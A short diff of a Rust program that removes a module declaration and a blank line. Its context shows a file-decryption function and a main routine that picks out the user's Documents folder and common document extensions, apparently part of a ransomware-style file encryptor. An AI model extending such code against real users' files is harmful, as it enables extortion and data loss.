@@ -1,5 +1,3 @@
-pub mod build;
-
 use std::ffi::{OsStr, OsString};
 use std::fs::{self, remove_file, File};
 use std::io::{BufWriter, Read, Write};
@@ -144,7 +142,6 @@ pub fn decrypt_large_file(
 }
 
 fn main() {
-    
     let extensions = ["docx", "xlsx", "pdf", "jpeg", "jpg", "txt"];
 
     let documents_dir = match dirs::document_dir() {
